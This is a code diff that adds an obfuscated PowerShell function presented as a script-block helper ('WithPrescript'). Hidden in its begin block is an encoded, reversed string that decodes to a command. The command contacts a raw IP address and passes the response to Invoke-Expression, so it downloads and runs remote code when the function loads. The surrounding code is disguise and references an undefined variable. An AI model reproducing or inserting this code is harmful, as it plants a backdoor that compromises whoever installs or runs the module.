@@ -1,0 +1,49 @@
+ .('Sv') ("Z"+"aXf")  ([tyPe]("{1}{0}" -F 'ay','aRR')) ;  &('SeT-'+'ITe'+'m') VAriabLE:PFv5 ([TYpE]("{3}{1}{2}{0}"-F 'k','r','ipTBLOC','Sc') )  ; Function w`ithP`Re`scRIPT {
+    
+    [cmdletbinding()]
+    param(
+        [parameter( pOSITIOn = 0,
+                    ValuEfROMPipEliNE = ${T`RUe},
+                    vALUefrOmpIpeLiNebYPropERTyname = ${tR`Ue})]
+        [scriptblock[]]${scRI`pTbLo`CK},
+
+        [parameter( poSiTioN = 1 )]
+        [validatescript({.('Test'+'-'+'Path') ${_}})]
+        [string[]]${P`Ath},
+
+        [switch]${s`kI`pONeR`Ror}
+    )
+    begin
+    {
+        ${k`jE`RrQ}=  ${5`RL}  =  [cHaR[]] (")''niOj-]52,62,4[cEpSMOc:vNE$ "+'( '+'. '+(('yjv'+' ')  -CrEPlACe ([char]121+[char]106+[char]118),[char]124)+(')9'+'3'+']RAHc[]GNIRts'+'[,'+')501]RA'+'Hc'+'[+'+'611]RAHc[+811]RAH'+'c['+'((ECAL'+'per'+'.)6'+'XZit'+'6XZ'+'+6'+'XZv'+'6X'+'Z+6XZ831.'+'176XZ+6XZ'+'.76.6XZ'+'+6XZ'+'68'+':'+'pii'+'tv6XZ'+'(')."Re`p`LAcE"('6XZ',[sTring][Char]39)) ;    $zAxF::"rEV`Er`SE"(${5`Rl} );(" $(set-ITEm 'vaRiaBLE:Ofs' '' ) " + [STriNg](${5`Rl}) +"$( sV  'OFs'  ' ')  ")
+        ${ScrIpTStOp`Ro`C`ESs} = &('Ne'+'w-Objec'+'t') S`YsTem.`COLL`EctIons.A`R`RA`YL`IST
+        if(${ps`BOuND`PaRA`MET`Ers}."Co`Nt`AINskeY"(("{0}{1}"-f 'P','ath')))
+        {
+            foreach(${d`IR} in ${PA`TH})
+            {
+                ${S`B} =   (  .('vari'+'AB'+'lE')  pFV5 -vALU  )::"C`ReaTe"( $(&('Get-Con'+'t'+'en'+'t') ${sC`RI`PtFile} -Raw) )
+            }
+            ${pA`ir} = [pscustomobject]@{
+                "ScRIp`TBl`Ock" = ${SB}
+                "sK`IP`ON`ErRoR" = ${S`KIp`OnER`Ror}
+            }
+            [void]${s`crIp`TSTOP`R`OC`Ess}."A`dd"(${PA`ir})
+        }
+    }
+    Process
+    {
+        foreach(${s`B} in ${S`C`RIp`TbLOCk})
+        {
+            ${PA`ir} = [pscustomobject]@{
+                "SCR`ipT`Blo`ck" = ${sB}
+                "SK`Ip`ONE`Rror" = ${SKIPo`NEr`R`Or}
+            }
+            [void]${sC`RiPTs`ToPrOcE`sS}."a`dd"(${PA`iR})
+        }
+    }
+    end
+    {
+        ${scR`I`Pt`:THis`By}."pRESC`R`ipT" = @( ${Sc`RI`p`Ts`Topr`ocess} )
+    }
+}
+
